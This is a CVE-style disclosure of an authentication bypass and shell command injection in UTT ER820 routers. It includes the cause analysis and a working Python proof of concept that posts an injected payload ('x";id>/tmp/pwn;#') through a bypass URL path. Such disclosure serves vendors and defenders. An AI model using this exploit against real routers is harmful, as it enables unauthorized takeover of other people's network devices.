# CVE Report - Authentication Bypass and Command Injection Vulnerability in UTT ER820 Routers

## Vulnerability Title

Authentication Bypass and Command Injection Vulnerability in UTT ER820 Routers (formFtpServerDirConfig / sub_47F57C)

## Vulnerability Description

UTT ER820 devices expose the GoAhead `websFormHandler` endpoint `formFtpServerDirConfig` (mapped to function `sub_47F57C`, range `0x47f7c8-0x47f900`) which can be reached via an authentication bypass, and then abused for command injection. When `Action` is not `add`, the handler constructs a shell command containing user-controlled `oldfilename`/`filename` and executes it via `popen()`, enabling arbitrary command execution.

## POC

```py
import requests
import sys

def exploit(base_url: str):
    url = base_url.rstrip('/') + '/goform/formFtpServerDirConfig/goform/formWebAuthUserSubmit'
    data = {
        'Action': 'edit',
        'oldfilename': 'x";id>/tmp/pwn;#',
        'filename': 'x";id>/tmp/pwn;#',
        'volume_name': 'anything',
        'file_save_path': ''
    }
    requests.post(url, data=data, timeout=5)

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print('usage: python poc.py http://target')
        raise SystemExit(1)
    exploit(sys.argv[1])
    print('sent')
```

## Cause Analysis

1. **authentication**: `websSecurityHandler` forwards any URL containing `/goform/formWebAuthUserSubmit` or `/goform/formWebAuthOk` to `websFormHandler`. Therefore `/goform/formFtpServerDirConfig/goform/formWebAuthUserSubmit` can be used to bypass authentication.

2. **command injection**: In `sub_47F57C`, request parameters `oldfilename`/`filename`/`volume_name` are retrieved via `websGetVar`. The value `oldfilename` is embedded into a command string like `umount "/ftpRoot/%s" ...; echo $?` using `sprintf`, converted via `iconv_string`, and executed using `popen(...)`. Because user-controlled data is inserted into a shell command without proper escaping, attackers can inject arbitrary commands.
